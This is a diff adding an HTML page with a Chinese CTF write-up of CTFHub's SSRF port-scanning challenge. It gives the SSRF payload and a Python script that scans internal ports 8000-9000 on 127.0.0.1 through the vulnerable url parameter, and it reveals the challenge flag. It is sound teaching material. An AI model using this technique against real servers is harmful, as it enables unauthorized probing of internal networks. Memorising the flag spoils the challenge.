@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【CTFHub】Web-SSRF端口扫描 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+        .diff-box { background-color: #f1f8ff; border-left: 4px solid #0366d6; padding: 10px 15px; margin: 15px 0; border-radius: 4px; }
+        .payload-box { background-color: #fafbfc; border: 1px solid #e1e4e8; padding: 10px; border-radius: 6px; margin: 10px 0; }
+        .payload-box p { margin: 5px 0; }
+        .step-box { margin-bottom: 20px; padding: 15px; border: 1px solid #e1e4e8; border-radius: 6px; background-color: #fff; }
+        .step-box h3 { margin-top: 0; color: #24292e; font-size: 1.1em; border-bottom: 1px solid #eaecef; padding-bottom: 5px; }
+        .info-line { margin: 5px 0; }
+        .info-label { font-weight: bold; color: #586069; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a ></p >
+    <h1>【CTFHub】Web-SSRF端口扫描 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.9.26 | <strong>分类：</strong>CTF | <strong>标签：</strong>CTFHub, Web, SSRF, 端口扫描, Python脚本</p >
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>CTFHub</li>
+        <li><strong>分类：</strong>Web - SSRF / 端口扫描</li>
+        <li><strong>题目名称：</strong>端口扫描</li>
+        <li><strong>环境：</strong>VS Code + Python 环境。</li>
+        <li><strong>目标：</strong>利用 SSRF 漏洞探测内网 8000-9000 端口范围，找到存活的端口并读取 Flag。</li>
+    </ul>
+
+    <h2>2. 解题思路与知识点</h2>
+    <p><strong>本关核心考点：</strong>利用 SSRF 漏洞进行内网端口探测。正常的 SSRF 读取文件或访问网络都依赖于目标服务器主动发起请求。端口扫描的原理，就是让服务器去访问 <code>127.0.0.1:8000-9000</code>，根据返回的状态码和响应内容来判断端口开放情况。</p >
+    
+    <div class="diff-box">
+        <strong>工具思考：为什么果断放弃 BP，直接用 Python 脚本？</strong>
+        <ul>
+            <li><strong>痛点：</strong>题目要求扫描 8000-9000 这 1000 个端口。如果使用 Burp Suite 社区版（Community Edition），其 Intruder 模块有严格的限速（每秒只能发一个请求）。跑完这 1000 个请求需要 15 分钟以上，极大概率会拖垮靶场环境或导致超时。</li>
+            <li><strong>优势：</strong>使用 Python 脚本可以精准控制超时时间，遇到未开放的端口能秒级跳过，整个扫描过程只需几秒钟，既高效又准确。</li>
+        </ul>
+    </div>
+
+    <h2>3. 详细步骤</h2>
+    
+    <div class="step-box">
+        <h3>第一步：浏览器验证注入点</h3>
+        <div class="payload-box">
+            <p><strong>Payload：</strong> <code>?url=http://127.0.0.1:8000/</code></p>
+        </div>
+        <p class="info-line"><span class="info-label">执行目的：</span>在浏览器中确认 SSRF 漏洞存在，且 <code>url</code> 参数可控，可以指定任意端口。</p >
+        <p class="info-line"><span class="info-label">回显结果：</span>页面没有直接抛出异常，验证了参数的有效性。</p >
+        <p class="info-line"><span class="info-label">获得信息：</span>确认攻击点，因为需要批量发包，决定改用 Python 脚本进行自动化扫描。</p >
+    </div>
+
+    <div class="step-box">
+        <h3>第二步：编写 Python 脚本</h3>
+        <div class="payload-box">
+            <p><strong>脚本代码：</strong></p>
+            <pre><code>import requests
+
+base_url = "http://challenge-da26e1fcda4606a0.sandbox.ctfhub.com:10800/?url=http://127.0.0.1:"
+
+for port in range(8000, 9001):
+    try:
+        r = requests.get(base_url + str(port) + "/", timeout=1.5)
+        if r.status_code == 200 or "ctfhub" in r.text:
+            print(f"[+] 端口 {port} 开放！状态码: {r.status_code}")
+            if "ctfhub" in r.text:
+                print(f"    >>> 发现 Flag: {r.text.strip()}")
+                break
+    except Exception:
+        pass
+print("扫描结束！")</code></pre>
+        </div>
+        <p class="info-line"><span class="info-label">代码逐行解析：</span></p >
+        <ul>
+            <li><code>import requests</code>：导入 Python 的 HTTP 请求库，这是用来向靶场发起请求的核心模块。</li>
+            <li><code>base_url = "..."</code>：定义靶场的基 URL。注意末尾拼了 <code>http://127.0.0.1:</code>，这样在循环里只需要拼上端口号就能构造出完整的 SSRF 攻击 URL。</li>
+            <li><code>for port in range(8000, 9001):</code>：使用 for 循环遍历从 8000 到 9000 的所有整数。Python 的 range 函数右区间是开区间，所以要写 9001 才能包含 9000。</li>
+            <li><code>try...except Exception: pass</code>：异常处理机制。这是脚本能跑通的关键。如果请求一个未开放的端口，requests 会直接抛出连接异常。如果不捕获异常，脚本会立刻崩溃；加上这个后，遇到报错会自动跳过，继续扫下一个端口。</li>
+            <li><code>r = requests.get(base_url + str(port) + "/", timeout=1.5)</code>：核心请求语句。将基 URL 和当前端口拼接，发送 GET 请求。重点在于 <strong><code>timeout=1.5</code></strong>，因为请求一个未开放的端口时，服务器可能会长时间挂起不返回。设置 1.5 秒的超时，能极大地加快扫描速度，避免卡死。</li>
+            <li><code>if r.status_code == 200 or "ctfhub" in r.text:</code>：判断逻辑。如果 HTTP 状态码是 200（请求成功），或者响应内容中包含了 "ctfhub" 关键字，说明这个端口是开放的且可能就是我们要找的目标。</li>
+            <li><code>print(f"[+] 端口 {port} 开放！...")</code>：打印出开放端口的信息。</li>
+            <li><code>if "ctfhub" in r.text:</code>：进一步确认，如果响应体里发现了 ctfhub 特征，说明 Flag 就在这个端口的页面里。</li>
+            <li><code>print(f"    >>> 发现 Flag: {r.text.strip()}")</code>：打印 Flag，并使用 .strip() 去除可能存在的首尾空白字符。</li>
+            <li><code>break</code>：找到 Flag 后立刻跳出循环，结束扫描，避免做无用的探测。</li>
+        </ul>
+    </div>
+
+    <div class="step-box">
+        <h3>第三步：运行脚本获取 Flag</h3>
+        <div class="payload-box">
+            <p><strong>执行操作：</strong>在 VS Code 的终端中运行该 Python 脚本。</p>
+        </div>
+        <p class="info-line"><span class="info-label">执行目的：</span>自动化批量探测 8000-9000 端口，寻找隐藏的 Flag。</p >
+        <p class="info-line"><span class="info-label">回显结果：</span>终端迅速打印出扫描结果，发现端口 <code>8804</code> 开放，并在其响应体中发现了 <code>ctfhub{67bda0b093b9703b9fccb33e}</code>。</p >
+        <p class="info-line"><span class="info-label">获得信息：</span>成功利用 SSRF 扫描到内网开放端口 8804，并提取 Flag 提交通关。</p >
+    </div>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>坑1：使用 BP 社区版进行端口扫描纯属浪费时间。</strong> BP 免费版每秒只能发1个请求，面对1000个端口的扫描任务极大概率导致超时或靶场崩溃。在需要批量发包的场景下，写脚本远比用现成的渗透工具靠谱。</li>
+        <li><strong>坑2：忽略 <code>timeout</code> 导致脚本卡死。</strong> 写 Python 脚本时，如果不设置 <code>timeout=1.5</code>，遇到未开放端口，requests 会一直等待服务器响应，导致扫描极其缓慢甚至中断。</li>
+    </ul>
+
+    <h2>5. 知识总结</h2>
+    <ul>
+        <li><strong>SSRF 端口扫描原理：</strong>通过让目标服务器请求内部 IP 的不同端口，根据 HTTP 状态码或响应内容来判断端口是否开放。</li>
+        <li><strong>工具的选择：</strong>CTF 比赛中灵活运用 Python 脚本，能轻松绕过图形化工具的局限性（如 BP 社区版的限速）。学会写简单的自动化脚本，是 Web 安全进阶的必备能力。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p >
+    </div>
+</body>
+</html>
